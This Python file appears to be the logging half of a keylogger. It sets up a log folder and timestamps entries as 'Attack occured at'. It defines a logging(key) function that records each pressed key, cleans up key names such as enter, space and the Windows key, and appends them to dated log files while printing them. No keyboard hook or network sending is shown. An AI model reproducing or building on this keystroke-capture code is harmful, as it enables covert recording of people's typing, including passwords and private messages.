import datetime
import subprocess
import os

path = os.getcwd()
log_dir_path = path+"/log/"

if not os.path.exists(log_dir_path):
    os.mkdir(log_dir_path)

text = [] #Store Keystroke

def write_date():
    date = datetime.datetime.now()
    file_name = log_dir_path+str(date.day)+ str(date.month) + str(date.year) + "_" + str(date.hour) + str(date.minute) + "_log.txt"
    f = open(file_name,'a')
    f.writelines("\nAttack occured at: " + str(date) + "\n")
    f.close()

def logging(key):
    global text

    #File Naming Convention
    date = datetime.datetime.now()
    file_name = log_dir_path+str(date.day)+ str(date.month) + str(date.year) + "_" + str(date.hour) + str(date.minute) + "_log.txt"

    text.append(str(key)) #Append Keystroke to list
    for t in text:
        final = t.replace("'","")
        if final.find('Key') != -1:  #Replace Key.xxx 
            repl_key = final.replace("Key.","")
            final = repl_key
        if final.find('cmd') != -1:
            repl_modifier = final.replace("cmd","Windows Key") #Replace cmd to windows key
            final = repl_modifier
        if final.find('enter') != -1:
            repl_modifier = final.replace("enter","\\n") #Replace enter to '\n'
            final = repl_modifier   
        if final.find('space') != -1:
            repl_modifier = final.replace("space","[space]") #Replace enter to '\n'
            final = repl_modifier   
        
    

    #Creating File based on FNC
    # if os.name == 'posix':
    #     f = open(file_name,'a')
    #     f.write(final + ' ')
    #     f.close()
    # elif os.name == 'nt':
    f = open(file_name,'a')
    f.write(final + '')
    f.close()

    
    print("Pressed Keystroke: {}".format(final))

